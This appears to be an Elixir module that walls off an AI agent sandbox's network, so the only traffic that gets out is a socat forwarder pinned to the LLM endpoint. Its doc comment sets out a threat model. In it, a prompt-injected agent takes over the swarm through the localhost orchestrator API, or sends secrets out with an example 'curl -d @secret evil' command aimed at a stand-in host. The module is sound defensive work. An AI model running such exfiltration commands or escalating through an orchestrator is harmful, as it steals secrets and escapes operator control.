defmodule Genswarms.Backends.EgressGuard do
  @moduledoc """
  Network-egress isolation for agent sandboxes (`network: :isolated`).

  ## Threat model

  An agent that ingests untrusted/external content (a web page, a third-party
  file, a message from an outside user) can be *prompt-injected*: the attacker
  then controls what the agent does. Because agent sandboxes share enough of the
  host to reach the orchestrator (bwrap shares the host network namespace; a
  `:local` agent is a bare host process), an injected agent can:

    * reach the orchestrator REST/WS API on `localhost` and escalate from
      "controls its own sandbox" to "controls the whole swarm" (other agents,
      objects, the task queue / SQLite state), and
    * exfiltrate secrets/context to an arbitrary host (`curl -d @secret evil`).

  The topology is the intended capability boundary for inter-agent messaging;
  these out-of-band network paths bypass it. `:isolated` mode closes them.

  ## Mechanism

  `:isolated` gives the sandbox **no network at all** (bwrap `--unshare-net`,
  docker `--network none`). The only egress is a host-side Unix-domain socket,
  bind-mounted into the sandbox, that a `socat` forwarder pins to the resolved
  LLM endpoint host:port. A `.curlrc` injected into the sandbox makes the
  agent's `curl` (subzeroclaw's transport — see `subzeroclaw.c`) connect through
  that socket automatically.

  Net effect inside the sandbox:

      curl http://localhost:4000/...   -> fails (no network)
      curl https://evil.example/...    -> fails (socket only reaches the LLM)
      curl $SUBZEROCLAW_ENDPOINT        -> works (the one pinned destination)

  TLS stays end-to-end between the agent's `curl` and the LLM; `socat` only
  relays bytes and the destination host:port is fixed on the host, not chosen by
  the agent.

  ## Caveat

  The forwarder destination is the *resolved* endpoint. If a per-agent
  `:endpoint` is attacker-influenced (the dynamic add-agent API), isolation only
  holds when that endpoint is operator-controlled. Use alongside an endpoint
  allowlist for agents created through the API.
  """

  require Logger

  @default_endpoint "https://openrouter.ai/api/v1/chat/completions"

  # Path of the forwarder socket as seen *inside* the sandbox. The agent
  # workspace is bind-mounted at /workspace, so a socket created in the host
  # workspace dir is visible here with no extra bind.
  @sandbox_socket "/workspace/.llm.sock"
  @sandbox_socket_name ".llm.sock"

  defstruct [:port, :socket_path]

  @type t :: %__MODULE__{port: port() | nil, socket_path: String.t() | nil}

  @doc "Whether the agent config requested network isolation."
  @spec isolated?(map()) :: boolean()
  def isolated?(config), do: Map.get(config, :network, :open) == :isolated

  @doc "Sandbox-side path of the forwarder socket (for `.curlrc`)."
  @spec sandbox_socket() :: String.t()
  def sandbox_socket, do: @sandbox_socket

  @doc "Host-side path of the forwarder socket, given the agent workspace."
  @spec host_socket_path(String.t()) :: String.t()
  def host_socket_path(workspace), do: Path.join(workspace, @sandbox_socket_name)

  @doc """
  bwrap flags that drop the sandbox's network namespace under isolation.
  Returns `[]` for the default (`:open`) so existing behavior is unchanged.
  """
  @spec bwrap_net_args(map()) :: [String.t()]
  def bwrap_net_args(config) do
    if isolated?(config), do: ["--unshare-net"], else: []
  end

  @doc "Effective LLM endpoint URL: explicit config, then env, then default."
  @spec resolve_endpoint(map()) :: String.t()
  def resolve_endpoint(config) do
    Map.get(config, :endpoint) || System.get_env("SUBZEROCLAW_ENDPOINT") || @default_endpoint
  end

  @doc """
  Parses an endpoint URL into the `{host, port}` the forwarder connects to.
  Falls back to 443 (https) / 80 (http) when the URL omits an explicit port.
  """
  @spec endpoint_target(String.t()) :: {:ok, {String.t(), pos_integer()}} | {:error, term()}
  def endpoint_target(url) when is_binary(url) do
    case URI.parse(url) do
      %URI{host: host, port: port, scheme: scheme} when is_binary(host) and host != "" ->
        {:ok, {host, port || default_port(scheme)}}

      _ ->
        {:error, :invalid_endpoint}
    end
  end

  def endpoint_target(_), do: {:error, :invalid_endpoint}

  defp default_port("http"), do: 80
  defp default_port(_), do: 443

  @doc """
  Builds the `socat` invocation `{executable, argv}` for the forwarder:
  a forking Unix-listener that relays each connection to `host:port`.
  `unlink-early` clears a stale socket; `mode=0600` keeps it owner-only.
  """
  @spec socat_command(String.t(), String.t(), pos_integer()) :: {String.t(), [String.t()]}
  def socat_command(host_socket_path, host, port) do
    left = "UNIX-LISTEN:#{host_socket_path},fork,mode=0600,unlink-early"
    right = "TCP:#{host}:#{port}"
    {find_executable("socat"), [left, right]}
  end

  @doc "Contents of the `.curlrc` that routes the agent's curl through the socket."
  @spec curlrc_content() :: String.t()
  def curlrc_content, do: ~s(unix-socket = "#{@sandbox_socket}"\n)

  @doc """
  Starts the egress forwarder for an isolated agent.

  Writes the sandbox `.curlrc`, removes any stale socket, and spawns the `socat`
  forwarder pinned to the resolved endpoint. Returns `{:ok, t}` (held by the
  backend for cleanup) or `{:error, reason}`.
  """
  @spec start_forwarder(String.t(), map()) :: {:ok, t()} | {:error, term()}
  def start_forwarder(workspace, config) do
    endpoint = resolve_endpoint(config)

    with {:ok, {host, port}} <- endpoint_target(endpoint) do
      socket_path = host_socket_path(workspace)
      File.rm(socket_path)
      File.write!(Path.join(workspace, ".curlrc"), curlrc_content())

      {socat, args} = socat_command(socket_path, host, port)

      if is_nil(socat) or not File.exists?(socat) do
        {:error, :socat_not_found}
      else
        port_ref =
          Port.open({:spawn_executable, socat}, [
            :binary,
            :exit_status,
            {:args, args}
          ])

        {:ok, %__MODULE__{port: port_ref, socket_path: socket_path}}
      end
    end
  end

  @doc "Stops the forwarder and removes its socket. Safe on nil."
  @spec stop_forwarder(t() | nil) :: :ok
  def stop_forwarder(nil), do: :ok

  def stop_forwarder(%__MODULE__{port: port, socket_path: socket_path}) do
    if port do
      try do
        Port.close(port)
      rescue
        _ -> :ok
      end
    end

    if socket_path, do: File.rm(socket_path)
    :ok
  end

  defp find_executable(name) do
    paths = [
      "/run/current-system/sw/bin/#{name}",
      "/usr/bin/#{name}",
      "/bin/#{name}"
    ]

    Enum.find(paths, &File.exists?/1) || System.find_executable(name)
  end
end
